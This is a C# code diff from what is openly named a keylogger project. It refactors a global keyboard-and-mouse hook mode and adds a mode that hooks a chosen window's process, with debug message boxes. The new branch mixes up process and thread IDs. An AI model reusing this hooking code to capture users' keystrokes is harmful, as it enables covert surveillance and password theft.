@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
 using KeyBoardHook.Common.Native;
@@ -80,6 +82,8 @@ namespace KeyBoardHook.KeyLogger.Service
             
             
             IntPtr threadId = IntPtr.Zero;
+
+            IntPtr moduleHandle;
             switch (type)
             {
                 case "当前进程钩子":
@@ -90,13 +94,23 @@ namespace KeyBoardHook.KeyLogger.Service
                     break;
                 case "全局钩子":
                     threadId = IntPtr.Zero;
-                    var moduleHandle = NativeMethods.GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
+                    moduleHandle = NativeMethods.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
                     _keyboardHook.Hook(HookType.WH_KEYBOARD_LL,moduleHandle, threadId);
                     mouseHookService.Hook(HookType.WH_MOUSE_LL,moduleHandle, threadId);
                     _activeWindowHook.Hook(threadId);
                     break;
                 case "指定窗口进程钩子":
-                    threadId = IntPtr.Zero;
+                    var hWnd = NativeMethods.FindWindow(
+                        className.Equals("")?null:className, title.Equals("")?null:title);
+                    NativeMethods.GetWindowThreadProcessId(hWnd, out threadId);
+                    MessageBox.Show("hWnd:" + hWnd + " threadId:" + threadId);
+                    if (threadId.Equals(IntPtr.Zero))
+                    {
+                        throw new Exception("threadId.Equals(IntPtr.Zero)");
+                    }
+                    moduleHandle = NativeMethods.GetModuleHandle(Process.GetProcessById(threadId.ToInt32()).MainModule.ModuleName);
+                    MessageBox.Show("moduleHandle:"  + moduleHandle);
+                    mouseHookService.Hook(HookType.WH_MOUSE_LL,moduleHandle, threadId);
                     break;
               
             }
